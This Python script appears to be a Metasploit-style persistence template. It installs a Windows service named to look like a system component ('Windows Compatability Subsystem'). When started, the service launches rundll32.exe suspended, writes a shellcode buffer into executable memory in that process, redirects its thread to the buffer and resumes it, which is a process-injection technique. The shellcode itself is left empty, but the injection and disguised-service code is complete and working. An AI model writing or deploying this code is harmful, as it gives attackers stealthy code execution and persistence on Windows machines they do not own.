#our needed imports
import win32service
import win32serviceutil
import win32api
import win32con
import win32event
import win32evtlogutil
import os
import ctypes

from ctypes import *
from ctypes.wintypes import BOOL
import binascii

#shellcode here
shellcode = ''

#define types for ctype windows DLL calls
BYTE      = c_ubyte
WORD      = c_ushort
DWORD     = c_ulong
LPBYTE    = POINTER(c_ubyte)
LPTSTR    = POINTER(c_char) 
HANDLE    = c_void_p
PVOID     = c_void_p
LPVOID    = c_void_p
UNIT_PTR  = c_ulong
SIZE_T    = c_ulong


#Constant for payload size
PAYLOAD_SIZE = 8192

#all of our structs necessary to pass by reference
class FLOATING_SAVE_AREA(Structure): 
    _fields_ = [('ControlWord',     DWORD), 
                ('StatusWord',      DWORD), 
                ('TagWord',         DWORD), 
                ('ErrorOffset',     DWORD), 
                ('ErrorSelector',   DWORD), 
                ('DataOffset',      DWORD), 
                ('DataSelector',    DWORD), 
                ('RegisterArea',    BYTE * 80), 
                ('Cr0NpxState',     DWORD)] 
				
class STARTUPINFO(Structure):
    _fields_ = [("cb",            DWORD),        
                ("lpReserved",    LPTSTR), 
                ("lpDesktop",     LPTSTR),  
                ("lpTitle",       LPTSTR),
                ("dwX",           DWORD),
                ("dwY",           DWORD),
                ("dwXSize",       DWORD),
                ("dwYSize",       DWORD),
                ("dwXCountChars", DWORD),
                ("dwYCountChars", DWORD),
                ("dwFillAttribute",DWORD),
                ("dwFlags",       DWORD),
                ("wShowWindow",   WORD),
                ("cbReserved2",   WORD),
                ("lpReserved2",   LPBYTE),
                ("hStdInput",     HANDLE),
                ("hStdOutput",    HANDLE),
                ("hStdError",     HANDLE),]

class PROCESS_INFORMATION(Structure):
    _fields_ = [("hProcess",    HANDLE),
                ("hThread",     HANDLE),
                ("dwProcessId", DWORD),
                ("dwThreadId",  DWORD),]

class CONTEXT(Structure):
    _fields_ = [("ContextFlags", DWORD),
                ("Dr0", DWORD),
                ("Dr1", DWORD),
                ("Dr2", DWORD),
                ("Dr3", DWORD),
                ("Dr6", DWORD),
                ("Dr7", DWORD),
                ("FloatSave", FLOATING_SAVE_AREA),
                ("SegGs", DWORD),
                ("SegFs", DWORD),
                ("SegEs", DWORD),
                ("SegDs", DWORD),
                ("Edi", DWORD),
                ("Esi", DWORD),
                ("Ebx", DWORD),
                ("Edx", DWORD),
                ("Ecx", DWORD),
                ("Eax", DWORD),
                ("Ebp", DWORD),
                ("Eip", DWORD),
                ("SegCs", DWORD),
                ("EFlags", DWORD),
                ("Esp", DWORD),
                ("SegSs", DWORD),
                ("ExtendedRegisters", BYTE * 512)]
				
#the service that runs when given a control argument
class aservice(win32serviceutil.ServiceFramework):
   
   _svc_name_ = "MsfCMPT"
   _svc_display_name_ = "Windows Compatability Subsystem"
         
   def __init__(self, args):
           win32serviceutil.ServiceFramework.__init__(self, args)
           self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)           

   def SvcStop(self):
           self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
           win32event.SetEvent(self.hWaitStop)                    
         
   def SvcDoRun(self):
      import servicemanager      
      #servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,servicemanager.PYS_SERVICE_STARTED,(self._svc_name_, '')) 
      self.timeout = 120000     #120 seconds / 2 minutes
      
      #init all the information for creating a process
      si = STARTUPINFO()
      pi = PROCESS_INFORMATION()
      Context = CONTEXT()      
      si.cb = sizeof(si)
      
      #create a process for rundll32.exe in a suspended state
      ctypes.windll.kernel32.CreateProcessA( None, "rundll32.exe", None, None, 0, win32con.CREATE_SUSPENDED, None, None, byref(si), byref(pi) )
      Context.ContextFlags = win32con.CONTEXT_FULL
      #get Thread context of new process
      ctypes.windll.kernel32.GetThreadContext( pi.hThread, byref(Context))
      #allocate memory in our process for the shellcode. Note: 8192 is static in the C template for MSF, so we are using it here
      lpPayload = ctypes.windll.kernel32.VirtualAllocEx( pi.hProcess, None, PAYLOAD_SIZE, win32con.MEM_COMMIT|win32con.MEM_RESERVE, win32con.PAGE_EXECUTE_READWRITE )
      #write shellcode in the address
      ctypes.windll.kernel32.WriteProcessMemory( pi.hProcess, lpPayload, shellcode, PAYLOAD_SIZE, None )
      #set the context instruction pointer to our shellcode
      Context.Eip = DWORD(lpPayload)
	  #Set the thread context based on our new context
      ctypes.windll.kernel32.SetThreadContext( pi.hThread, byref(Context) )

      #resume the process with our shellcode inside and instruction pointer on our shell code
      ctypes.windll.kernel32.ResumeThread( pi.hThread )
      ctypes.windll.kernel32.CloseHandle( pi.hThread  )
      ctypes.windll.kernel32.CloseHandle( pi.hProcess )
      SvcStop()  

def ctrlHandler(ctrlType):
   return True

#called on command line give the user their options
#handle start/stop/install/remove with options   
if __name__ == '__main__':   
   win32api.SetConsoleCtrlHandler(ctrlHandler, True)   
   win32serviceutil.HandleCommandLine(aservice)

